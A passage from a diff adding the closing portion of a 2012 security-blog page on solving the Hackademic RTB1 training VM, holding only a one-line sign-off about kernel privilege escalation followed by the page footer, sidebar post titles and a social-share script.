+<p>And that&rsquo;s game!  Pretty nice box, though I must admit priv esc vulnerabilities in out of date kernels are rather boring.  Next up, Hackademic RTB2.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-11-13T01:24:24-07:00" pubdate data-updated="true">Nov 13<span>th</span>, 2012</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/hackademic/'>hackademic</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>, <a class='category' href='/blog/categories/walkthrough/'>walkthrough</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2012/11/13/solving-hackademic-rtb1/" data-via="" data-counturl="http://hatRiot.github.io/blog/2012/11/13/solving-hackademic-rtb1/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2012/10/03/fastspy-buffer-overflow/" title="Previous Post: FastSpy 2.1.1 Buffer Overflow">&laquo; FastSpy 2.1.1 Buffer Overflow</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2012/11/18/solving-hackademic-rtb2/" title="Next Post: Solving Hackademic-RTB2">Solving Hackademic-RTB2 &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/05/13/rce-in-browser-exploitation-framework-beef/">rce in browser exploitation framework (BeEF)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion/">LFI to shell in Coldfusion 6-10</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/03/26/ibm-tealeaf-cx-remote-os-command-injection-lfi/">IBM Tealeaf CX (v8 Release 8) Remote OS Command Injection / LFI</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/03/10/meterpreter-shell-upgrades-using-powershell/">meterpreter shell upgrades using powershell</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/03/02/introduction/">introduction</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - Bryan Alexander -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
